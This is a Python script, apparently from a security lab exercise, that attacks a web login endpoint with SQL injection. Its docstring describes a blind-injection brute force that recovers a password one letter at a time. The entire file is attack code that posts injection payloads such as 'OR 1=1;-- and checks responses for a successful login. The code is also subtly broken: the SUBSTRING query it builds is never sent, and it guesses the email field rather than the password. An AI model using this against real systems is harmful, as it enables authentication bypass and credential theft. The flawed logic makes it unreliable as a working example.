import requests
import string

URL = "https://habitatcrater-geniusgenesis-5000.codio-box.uk/user/login"

def forceLetter(known):
    """
    Brute force a password through blind SQL injection

    @param known:  If we know any existing password elements
    """

    #Lowercase only
    for letter in string.ascii_lowercase:

        #Build up the input string
        pwString = f"{known}{letter}"
        pwLen = len(pwString)
        logging.debug("Checking %s", pwString)
        #SQL Statement
        sql = f"bleh' OR SUBSTRING(email, 1, {pwLen}) = '{pwString}';#"
        #logging.debug("SQL is %s", sql)
        #Build our input
        data = {"email": "'OR 1=1;--",
                "password" : "swordfish"}
        print(data)

        r = requests.post(URL, json = data)

        #Check for Match
        if "No such user or password" in r.text:
            logging.debug("No Match")
        else:
            logging.debug("Match found")
            return pwString


if __name__ == "__main__":

    import logging
    logging.basicConfig(level=logging.DEBUG)

    knownPw = ""
    out = forceLetter(knownPw)
    print(f"Match found {out}")